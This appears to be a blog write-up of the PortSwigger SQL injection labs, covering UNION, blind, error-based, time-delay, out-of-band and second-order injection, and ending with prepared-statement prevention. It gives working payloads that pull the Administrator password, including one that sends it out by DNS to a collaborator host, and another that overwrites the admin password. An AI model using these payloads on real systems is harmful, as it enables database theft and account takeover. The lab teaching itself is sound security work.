---
title: SQL Injection
tags:
  - Portswigger
  - Web Security
  - SQLi
categories:
  - Portswigger
position: right
cover: '/img/Generated Image June 12, 2026 - 7_00PM.png'
description: 'What I learned after completing SQL Injection path in Portswigger'
date: 2026-06-11 20:38:25
---

>  **Difficulty**: <span style="color:#9fef00">Practitioner</span>

## Introduction
This path includes all types of SQLi from Login Bypass, UNION Attacks, Blind Injections, Out-of-band-techniques and Second Order Injections. 
And more importantly, demonstrations of how attacks happen & how to prevent them.

<!-- more -->

## Origins Of SQLi

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query, but it can also happen in `UPDATE`, `INSERT`, or `SELECT` statements.
The root cause of such a <span style="color:#9fef00">CRITICAL</span> vulnerability is the concatenation of parameters while building the query.

```java
String query = "SELECT * FROM table_name WHERE column_name = '" + input + "'";
```

## Consequences of SQLi

SQL Injections can be used obviously to retrieve hidden data, getting critical personal info such as passwords, having admin access,
and even getting the version of the web server that is hosting the database or the entire web app. 

## Exploitation Techniques

### Picking targets 

While clicking on buttons and changing from windows you'll notice some parameters get added to the base or original URL.

*Example:* `https://blablabla.com/products?category=toys`

Those parameters are your targets to attack because the `WHERE` statements are located in there.

### Injecting comments 

Going back to our example `https://blablabla.com/products?category=toys` 
This will cause the application to make this SQL query:
```sql
SELECT * FROM products WHERE category = 'toys' AND available = 1;
```

Now when we send this exact payload to the URL `'--` to make it `https://blablabla.com/products?category=toys'--`
This will result in a new query:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
`--` is a comment indicator in SQL, thus the new forged query will be `SELECT * FROM products WHERE category = 'Gifts'`, which will make us able to see all products.

Another similar attack is injecting the famous `OR 1=1` payload alongside the comments to make the url `https://blablabla.com/products?category=toys'+OR+1=1--`
and the query to:
```sql
SELECT * FROM products WHERE category = 'toys' OR 1=1--' AND released = 1
```
As `1=1` is always true, we will get all products.

### UNION Attacks 

Now assume we know that there is a table named users that has columns named username and password, 
and back to our usual example `https://blablabla.com/products?category=toys`
the payload now is gonna be `' UNION SELECT username,password FROM users--`

which will result in this query:
```sql
SELECT name, description FROM products WHERE category = '' UNION SELECT username,password FROM users--'
```

{% note warning %}
**ALWAYS MAKE SURE THAT THE COLUMN NUMBERS OF THE ORIGINAL QUERY IS THE SAME AS THE NUMBER OF THE UNION ONE**
{% endnote %}

One trick to determine the number of columns is to keep appending `NULL` to the `UNION` query until the server returns a valid response. 
When that happens, the number of `NULL`s is the number of the columns.
`' UNION SELECT NULL,NULL,NULL--`

After determining the number of columns, try to change one `NULL` to `'a'` for example to check if that column type is a varchar: `' UNION SELECT 'a',NULL,NULL--`
Again, a positive answer is when the server returns a 200 HTTP response code.

With the UNION attack we can also examine the DB to get some useful info like:
* DB Version: `' UNION SELECT @@version--`
* Listing tables in the database: `SELECT * FROM information_schema.tables`
* Listing columns from tables: `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

### Blind SQLi

Blind SQLi means that we don't see the result of our injection in the web page; we only see some specific and minor changes that we need to keep an eye for.
For example, if the vulnerable target is the cookie and not a url parameter, then for this type of injection using **Burp Suite** is more practical and easier.

Here we can try boolean based operators: 
`cookie = '....xyz' AND '1'='1`  /  `cookie = '....xyz' AND '1'='2`

Then we keep thinking in a boolean way and try payloads such as:
`....xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
to try to brute force the password.

#### Error Based SQLi

We opt for this type of injection when the database returns clarifying errors that help in understanding its structure and contents.

For example, again while trying to inject the cookies:

* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` the `CASE` expression evaluates to `'a'`, which does not cause any error.
* `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` it evaluates to `1/0`, which causes a divide-by-zero error.

Using this technique, we can also retrieve data by testing one character at a time:
`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

#### Triggering Time Delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response.
In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

```sql
'; IF (1=2) WAITFOR DELAY '0:0:10'--           
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Using this technique, we can retrieve data by testing one character at a time:
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

#### Out-of-band technique (OAST)

Some applications are configured to process the queries asynchronously, which will lead us to exploit this vulnerability by triggering 
network interactions to a system that we control.
The most effective network protocol to use in this attack is DNS as many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This causes the Database to perform a lookup for this domain: `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

And after confirming the possibility of an exploit we can craft malicious payloads like this one: 
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password.

## Second Order SQLi

Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.

For example in a sign up page, in the username field you write:
```sql
InnocentMan';UPDATE users SET password='password' WHERE user='administrator'--
```
Then when logging in we can login as admin with `administrator` as username and `password` as password.


## How To Prevent SQLi

You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also known as "prepared statements".

The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:
```java
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

You can rewrite this code in a way that prevents the user input from interfering with the query structure:
```java
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

## Summary

As we saw in this article there are many types of SQLi and their prevention is very simple and effective.
Remember to always sanitize all input fields and all url params and even make some tests on the app you are building.
Don't forget to check for some syntax change depending on the database type you are dealing with.

{% note info %}
And I highly recommend scripting the lab solvings in python to learn new things and develop the mindset for creating your own tools. 
As a reference here is my repo where I pushed my scripts: [SQLi Scripts Repo](https://github.com/0xkoat/portswigger_scripts/tree/main/SQLI)
{% endnote %}

Have a nice day, and see you again in the next Article!
Any feedback in the comments section is very appreciated.
Thank you for your attention.
